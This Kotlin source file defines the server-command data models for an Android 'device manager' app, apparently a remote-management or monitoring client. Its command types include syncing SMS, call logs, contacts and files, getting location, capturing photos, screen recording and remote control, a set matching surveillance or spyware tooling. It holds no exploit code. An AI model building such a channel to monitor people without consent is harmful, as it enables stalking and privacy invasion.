package com.devicemanager.data.remote.model

import com.google.gson.annotations.SerializedName

/**
 * Incoming command from the server (via WebSocket or polling).
 */
data class Command(
    @SerializedName("id") val id: String,
    @SerializedName("type") val type: String,
    @SerializedName("payload") val payload: Map<String, Any>? = null,
    @SerializedName("created_at") val createdAt: String? = null
)

/**
 * WebSocket message wrapper for incoming commands.
 */
data class CommandMessage(
    @SerializedName("type") val type: String,
    @SerializedName("command") val command: Command
)

/**
 * Command status update request.
 * PUT /api/commands/{id}/status
 */
data class CommandStatusRequest(
    @SerializedName("status") val status: String,
    @SerializedName("result") val result: String? = null,
    @SerializedName("error") val error: String? = null
)

/**
 * WebSocket message for sending command status.
 */
data class CommandStatusMessage(
    @SerializedName("type") val type: String = "COMMAND_STATUS",
    @SerializedName("command_id") val commandId: String,
    @SerializedName("status") val status: String,
    @SerializedName("result") val result: String? = null,
    @SerializedName("error") val error: String? = null
)

/**
 * Response from pending commands polling.
 * GET /api/devices/{id}/commands/pending
 */
data class PendingCommandsResponse(
    @SerializedName("commands") val commands: List<Command>
)

/**
 * Command status constants.
 */
object CommandStatus {
    const val RECEIVED = "RECEIVED"
    const val EXECUTING = "EXECUTING"
    const val COMPLETED = "COMPLETED"
    const val FAILED = "FAILED"
    const val TIMEOUT = "TIMEOUT"
}

/**
 * Command type constants.
 */
object CommandType {
    const val GET_TELEMETRY = "GET_TELEMETRY"
    const val GET_LOCATION = "GET_LOCATION"
    const val GET_NOTIFICATIONS = "GET_NOTIFICATIONS"
    const val GET_USAGE_STATS = "GET_USAGE_STATS"
    const val SYNC_CONTACTS = "SYNC_CONTACTS"
    const val SYNC_CALLS = "SYNC_CALLS"
    const val SYNC_SMS = "SYNC_SMS"
    const val SYNC_FILES = "SYNC_FILES"
    const val CAPTURE_PHOTO = "CAPTURE_PHOTO"
    const val START_SCREEN_RECORD = "START_SCREEN_RECORD"
    const val STOP_SCREEN_RECORD = "STOP_SCREEN_RECORD"
    const val UPLOAD_FILE = "UPLOAD_FILE"
    const val PING = "PING"
    const val START_REMOTE_CONTROL = "START_REMOTE_CONTROL"
    const val STOP_REMOTE_CONTROL = "STOP_REMOTE_CONTROL"
    const val UPLOAD_FILE_CHUNKED = "UPLOAD_FILE_CHUNKED"
    const val CREATE_SNAPSHOT = "CREATE_SNAPSHOT"
    const val RUN_DIAGNOSTICS = "RUN_DIAGNOSTICS"
}
